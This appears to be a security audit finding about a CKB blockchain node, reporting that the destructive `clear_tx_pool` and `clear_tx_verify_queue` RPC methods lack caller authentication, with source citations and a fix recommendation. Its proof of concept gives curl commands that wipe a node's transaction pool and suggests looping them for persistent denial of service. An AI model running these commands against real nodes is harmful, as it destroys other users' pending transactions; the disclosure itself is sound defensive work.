### Title
Missing Caller Authentication on Destructive Pool RPC Methods Allows Any RPC Caller to Wipe the Transaction Pool - (File: `rpc/src/module/pool.rs`)

---

### Summary

The `clear_tx_pool` and `clear_tx_verify_queue` methods in the `PoolRpc` module perform destructive, privileged state mutations — wiping all pending transactions and the entire verification queue — but carry no caller authentication or authorization check. Any process that can reach the RPC port (a "supported local CLI/RPC user" or any RPC caller on an exposed node) can invoke these methods unconditionally, causing complete loss of all in-flight transactions for every user sharing that node.

---

### Finding Description

**Root cause — no access control on destructive RPC methods:**

`clear_tx_pool` and `clear_tx_verify_queue` are registered as standard `Pool` module methods with no authentication guard:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}

fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_verify_queue()
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [1](#0-0) 

The `Pool` module is enabled by default in the standard node configuration and is mounted without any per-method authentication: [2](#0-1) 

The RPC server itself has no authentication middleware — it uses `CorsLayer::permissive()` and processes every incoming request directly: [3](#0-2) 

There is no check anywhere in the call path that the caller is the node operator, the transaction submitter, or any other authorized identity. The `Pool` module is listed in the default `modules` config alongside read-only methods like `get_raw_tx_pool`, with no distinction in access level: [4](#0-3) 

**Analog to the original report:**
Just as `afterLockUpdate` in `ZLRewardsController` was intended to be called only by `ZeroLocker` but lacked a caller check, `clear_tx_pool` is intended to be a privileged operator action but has no restriction preventing any RPC caller from invoking it.

---

### Impact Explanation

An attacker (or any unprivileged local process) who can reach the RPC port can:

1. Call `clear_tx_pool()` to atomically remove every pending and proposed transaction from the pool. All transactions submitted by all users are silently discarded and must be resubmitted.
2. Call `clear_tx_verify_queue()` to drain the verification queue, causing all transactions currently being verified to be dropped before they are admitted.

Concrete consequences:
- **Service disruption**: All users who submitted transactions lose them from the pool without notification.
- **Miner revenue loss**: A miner's node loses all fee-bearing transactions it was about to include in a block.
- **Repeated attack**: The attacker can call `clear_tx_pool` in a tight loop, making the pool permanently empty and preventing any transaction from ever being confirmed on that node.
- **No recovery signal**: The RPC returns `null` on success; there is no audit log or alert to the node operator.

---

### Likelihood Explanation

- The RPC default bind address is `127.0.0.1:8114`, so the attacker must be able to reach that port. This is satisfied by any process running on the same host — a valid "supported local CLI/RPC user" attacker profile explicitly listed in scope.
- Many operators expose the RPC port to a broader network (e.g., for wallet integrations, dApp backends, or monitoring), which widens the attack surface to any network-reachable client.
- No credentials, keys, or special privileges are required. A single HTTP POST with a trivial JSON body is sufficient.
- The attack is trivially scriptable and repeatable.

---

### Recommendation

Introduce an authentication layer at the RPC server level (e.g., a bearer token or IP allowlist enforced in middleware) and/or split destructive pool management methods into a separate, separately-gated module (analogous to how `IntegrationTest` methods are gated behind `integration_test_enable()` and a Dummy PoW assertion). [5](#0-4) 

At minimum, `clear_tx_pool` and `clear_tx_verify_queue` should require an explicit operator secret (configurable token) passed as a parameter or HTTP header, checked before the pool mutation is performed.

---

### Proof of Concept

**Preconditions:** A CKB node is running with the default configuration (`Pool` module enabled, RPC on `127.0.0.1:8114`). Several users have submitted transactions to the pool.

**Attack steps:**

1. From any process on the same host (no credentials needed), send:

```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
```

2. Observe the response:
```json
{"id":1,"jsonrpc":"2.0","result":null}
```

3. Verify the pool is empty:
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# "pending":"0x0","proposed":"0x0"
```

All previously submitted transactions are gone. Repeat step 1 in a loop to prevent any transaction from ever accumulating in the pool. [6](#0-5) [7](#0-6)

### Citations

**File:** rpc/src/module/pool.rs (L298-323)
```rust
    /// Removes all transactions from the transaction pool.
    ///
    /// ## Examples
    ///
    /// Request
    ///
    /// ```json
    /// {
    ///   "id": 42,
    ///   "jsonrpc": "2.0",
    ///   "method": "clear_tx_pool",
    ///   "params": []
    /// }
    /// ```
    ///
    /// Response
    ///
    /// ```json
    /// {
    ///   "id": 42,
    ///   "jsonrpc": "2.0",
    ///   "result": null
    /// }
    /// ```
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L325-350)
```rust
    /// Removes all transactions from the verification queue.
    ///
    /// ## Examples
    ///
    /// Request
    ///
    /// ```json
    /// {
    ///   "id": 42,
    ///   "jsonrpc": "2.0",
    ///   "method": "clear_tx_verify_queue",
    ///   "params": []
    /// }
    /// ```
    ///
    /// Response
    ///
    /// ```json
    /// {
    ///   "id": 42,
    ///   "jsonrpc": "2.0",
    ///   "result": null
    /// }
    /// ```
    #[rpc(name = "clear_tx_verify_queue")]
    fn clear_tx_verify_queue(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L684-701)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```

**File:** rpc/src/service_builder.rs (L151-173)
```rust
        if self.config.integration_test_enable() {
            // IntegrationTest only on Dummy PoW chain
            assert_eq!(
                shared.consensus().pow,
                Pow::Dummy,
                "Only run integration test on Dummy PoW chain"
            );
        }
        let methods = IntegrationTestRpcImpl {
            shared,
            network_controller,
            chain,
            well_known_lock_scripts,
            well_known_type_scripts,
        };
        set_rpc_module_methods!(
            self,
            "IntegrationTest",
            integration_test_enable,
            add_integration_test_rpc_methods,
            methods
        )
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
